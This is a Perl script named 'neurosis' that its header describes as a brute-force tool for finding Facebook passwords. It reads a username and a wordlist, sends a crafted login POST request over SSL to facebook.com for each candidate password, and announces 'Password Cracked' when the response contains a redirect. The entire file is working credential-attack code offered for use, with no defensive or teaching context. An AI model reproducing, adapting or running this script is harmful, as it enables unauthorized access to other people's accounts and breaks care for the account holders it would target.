#!/usr/bin/perl
#
# Copyright (c) 2019 Barchampas Gerasimos <makindosx@gmail.com>.
# neurosis is a brute force program for find facebook passwords.
#
# neurosis is free software: you can redistribute it and/or modify
# it under the terms of the GNU Affero General Public License as
# published by the Free Software Foundation, either version 3 of the
# License, or (at your option) any later version.
#
#
# neurosis is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU Affero General Public License for more details.
#
# You should have received a copy of the GNU Affero General Public License, version 3,
# along with this program.  If not, see <http://www.gnu.org/licenses/>
#


use strict;
use Net::SSLeay::Handle;

if(!defined($ARGV[0] && $ARGV[1])) {

system('clear');
print "=====================================\n";
print "Usage: perl $0 login wordlist.txt\n";
print "=====================================\n";
exit; }

my $username = $ARGV[0];
my $wordlist = $ARGV[1];

open (LIST, $wordlist) || die "\n[-] Can't find/open $wordlist\n";

print "\n[+] Cracking Started on: $username ...\n\n";
print "=======================================\n";

while (my $password = <LIST>) {
chomp ($password);
$password =~ s/([^^A-Za-z0-9\-_.!~*'()])/ sprintf "%%%0x", ord $1 /eg;

my $PATH            =  "POST /login.php HTTP/1.1";
my $HOST            =  "Host: www.facebook.com";
my $CONN            =  "Connection: close";
my $CACHE           =  "Cache-Control: max-age=0";
my $ACCEPT          =  "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
my $ORIGIN          =  "Origin: https://www.facebook.com";
my $USER_AGENT      =  "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31";
my $CONTENT_TYPE    =  "Content-Type: application/x-www-form-urlencoded";
my $ACCEPT_ENCODING =  "Accept-Encoding: gzip,deflate,sdch";
my $ACCEPT_LANGUAGE =  "Accept-Language: en-US,en;q=0.8";
my $ACCEPT_CHARSET  =  "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3";

my $cookie = "cookie: datr=00x00x00x00x00x00x00x00x";
my $post = "email=$username&pass=$password&default_persistent=0&login=Log+In";
my $connect = length($post);
my $ATTACK  = "Content-Length: $connect";


my ($host, $port) = ("www.facebook.com", 443);

tie(*SSL, "Net::SSLeay::Handle", $host, $port);
  

print SSL "$PATH\n";
print SSL "$HOST\n";
print SSL "$CONN\n";
print SSL "$ATTACK\n";
print SSL "$CACHE\n";
print SSL "$ACCEPT\n";
print SSL "$ORIGIN\n";
print SSL "$USER_AGENT\n";
print SSL "$CONTENT_TYPE\n";
print SSL "$ACCEPT_ENCODING\n";
print SSL "$ACCEPT_LANGUAGE\n";
print SSL "$ACCEPT_CHARSET\n";
print SSL "$cookie\n\n";

print SSL "$post\n";

my $success;
while(my $result = <SSL>){
if($result =~ /Location(.*?)/){
$success = $1;
}
}
if (!defined $success)
{
print "\033[1;31m[-] $password -> Failed \n";
close SSL;
}
else
{
print "\033[1;32m\n########################################################\n";
print "[+] \033[1;32m Password Cracked: $password\n";
print "\033[1;32m########################################################\n\n";
close SSL;
exit;
}
}
